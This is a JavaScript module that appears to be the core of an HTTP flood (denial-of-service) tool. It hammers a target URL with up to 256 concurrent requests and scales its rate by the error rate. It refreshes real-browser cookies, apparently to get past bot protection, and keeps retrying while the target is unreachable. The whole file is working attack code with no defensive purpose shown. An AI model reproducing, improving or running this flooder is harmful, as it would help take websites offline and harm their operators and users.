const { sleep } = require('./helpers')
const { spawnClientInstance, resolve4, maxContentLength } = require('./client/client')
const { generateRequestHeaders } = require('./client/headers')
const { getRealBrowserHeaders } = require('./browser')

const FAILURE_DELAY = 60 * 1000
const ATTEMPTS = 15
// concurrent requests adopts based on error rate, but won't exceed the max value
const MAX_CONCURRENT_REQUESTS = 256

const UPDATE_COOKIES_INTERVAL = 9 * 60 * 1000

const ignoredErrCode = 'ECONNABORTED'
const maxSizeError = `maxContentLength size of ${maxContentLength} exceeded`

/**
 * @param {Object} opts
 * @param {string} opts.page url
 * @param {string=} [opts.ip] static ip address
 * @param {boolean=} [opts.useBrowser] run real browser to get cookies
 * @param {EventEmitter} eventEmitter
 * @return {Promise<void>}
 */
const runner = async ({ page: url, ip, useBrowser } = {}, eventEmitter) => {
  if (typeof url !== 'string' || url.length < 10 || !url.startsWith('http')) {
    console.log('Invalid value for URL', url)
    return
  }
  const printUrl = (useBrowser ? '[B] ' : '') + (url.length > 37 ? url.substring(0, 38) + '...' : url)
  const printIp = ip ? `[${ip}]` : ''

  let concurrentReqs = 4
  console.log('Starting process for', printUrl, printIp)

  const urlObject = new URL(url)
  let newIp = ip || (await resolve4(urlObject.hostname))
  let browserHeaders = await getRealBrowserHeaders(url, useBrowser && newIp)
  const client = spawnClientInstance(url)

  let isRunning = true
  let isActive = true
  let pending = 0
  let lastMinuteOk = 0
  let lastMinuteErr = 0
  let failureAttempts = 0

  let errRate = 0
  let total_reqs = 0
  let new_reqs = 0

  const getStatsFn = () => {
    eventEmitter.emit('RUNNER_STATS', {
      type: 'http',
      url: printUrl,
      ip: newIp,
      total_reqs,
      new_reqs,
      errRate,
      isActive,
    })
    new_reqs = 0
  }
  eventEmitter.on('GET_STATS', getStatsFn)

  // update cookies every 10 minutes
  const updateCookiesFn = async () => {
    if (isActive && isRunning && useBrowser) {
      const concurrentReqsPrev = concurrentReqs
      concurrentReqs = 3
      browserHeaders = await getRealBrowserHeaders(url, useBrowser && newIp)
      concurrentReqs = concurrentReqsPrev
    }
  }
  let updateCookiesInterval = setInterval(updateCookiesFn, UPDATE_COOKIES_INTERVAL)

  const adaptivenessInterval = 15
  let canIncrease = true
  const adaptIntervalFn = () => {
    if (failureAttempts === 0) {
      lastMinuteOk = 0
      lastMinuteErr = 0
      canIncrease = false

      if (errRate > 20) {
        concurrentReqs = Math.floor(concurrentReqs * 0.6)
      } else if (errRate > 10) {
        concurrentReqs = Math.floor(concurrentReqs * 0.8)
      } else if (errRate > 5) {
        concurrentReqs = Math.floor(concurrentReqs * 0.9)
      } else if (errRate < 1 && canIncrease) {
        concurrentReqs = Math.min(concurrentReqs + 3, MAX_CONCURRENT_REQUESTS)
      } else {
        canIncrease = true
      }
    }
  }
  let adaptInterval = setInterval(adaptIntervalFn, adaptivenessInterval * 1000)

  const stopEventFn = () => {
    isRunning = false
    clearInterval(adaptInterval)
  }
  eventEmitter.once('RUNNER_STOP', stopEventFn)

  while (isRunning) {
    if (!newIp || concurrentReqs < 3 || errRate > 95) {
      clearInterval(adaptInterval)
      clearInterval(updateCookiesInterval)
      const nextDelay = FAILURE_DELAY + failureAttempts * (FAILURE_DELAY / 2)
      console.log(printUrl, printIp, 'is not reachable. Retrying in', nextDelay, 'ms...')
      failureAttempts++
      // stop process
      if (failureAttempts >= ATTEMPTS) {
        isRunning = false
      } else {
        concurrentReqs = 5
        isActive = false
        await sleep(nextDelay)
        newIp = ip || (await resolve4(urlObject.hostname, newIp))
        browserHeaders = await getRealBrowserHeaders(url, useBrowser && newIp)
        isActive = true
        lastMinuteOk = 0
        lastMinuteErr = 0
        errRate = 0
        adaptInterval = setInterval(adaptIntervalFn, adaptivenessInterval * 1000)
        updateCookiesInterval = setInterval(updateCookiesFn, UPDATE_COOKIES_INTERVAL)
      }
    } else if (pending < concurrentReqs) {
      pending++

      client('', {
        ip: newIp,
        headers: browserHeaders || generateRequestHeaders(),
      })
        .then((res) => {
          if (res.status === 403) {
            lastMinuteErr++
          } else {
            failureAttempts = 0
            lastMinuteOk++
          }
        })
        .catch((err) => {
          if (err.code !== ignoredErrCode && err.message !== maxSizeError) {
            lastMinuteErr++
          }
        })
        .finally(() => {
          pending--
          total_reqs++
          new_reqs++
          errRate = Math.floor(100 * (lastMinuteErr / (1 + lastMinuteErr + lastMinuteOk)))
        })
    }
    await sleep(2)
  }

  clearInterval(updateCookiesInterval)
  clearInterval(adaptInterval)
  eventEmitter.off('GET_STATS', getStatsFn)
  eventEmitter.off('RUNNER_STOP', stopEventFn)
  console.log('Stopping runner for:', printUrl, printIp)
}

module.exports = { runner }
